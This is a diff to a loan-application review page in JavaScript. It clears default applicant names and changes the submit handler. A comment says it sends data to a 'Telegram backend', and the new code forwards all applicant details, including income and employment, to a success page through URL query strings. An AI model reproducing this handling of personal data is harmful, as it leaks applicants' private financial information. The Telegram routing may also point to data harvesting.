@@ -409,8 +409,8 @@
     const amount    = params.get('amount')    || '5000';
     const term      = params.get('term')      || '12';
     const purpose   = params.get('purpose')   || 'fee';
-    const firstName = params.get('firstName') || 'Jessy';
-    const lastName  = params.get('lastName')  || 'Kimutai';
+    const firstName = params.get('firstName') || '';
+    const lastName  = params.get('lastName')  || '';
     const email     = params.get('email')     || '';
     const phone     = params.get('phone')     || '';
     const loanType  = params.get('type')      || 'personal';
@@ -419,22 +419,20 @@
     document.getElementById('sumAmount').textContent    = 'ZMW ' + Number(amount).toLocaleString();
     document.getElementById('sumTerm').textContent      = term + ' Months';
     document.getElementById('sumPurpose').textContent   = decodeURIComponent(purpose);
-    document.getElementById('sumApplicant').textContent = firstName + ' ' + lastName;
+    document.getElementById('sumApplicant').textContent = (firstName + ' ' + lastName).trim() || '—';
 
     // ─── PREVIOUS keeps data intact ───
     document.getElementById('prevBtn').addEventListener('click', function () {
         this.href = `details.html?${params.toString()}`;
     });
 
-    // ─── SUBMIT → send to Telegram backend → then go to success.html ───
+    // ─── SUBMIT → send to Telegram backend → then go to success.html (WITH data) ───
     document.getElementById('submitBtn').addEventListener('click', async function (e) {
         e.preventDefault();
 
         const employment = document.getElementById('employment').value;
         const income     = document.getElementById('income').value;
 
-        // Show submitting state
-        const originalText = this.textContent;
         this.textContent = 'Submitting...';
         this.style.pointerEvents = 'none';
 
@@ -457,8 +455,12 @@
             console.error('❌ Failed to send:', err);
         }
 
-        // Continue to success page
-        window.location.href = 'success.html';
+        // ✅ Forward ALL client info to success.html
+        const forward = new URLSearchParams(params);
+        forward.set('employment', employment);
+        forward.set('income', income);
+
+        window.location.href = 'success.html?' + forward.toString();
     });
 </script>
 </body>
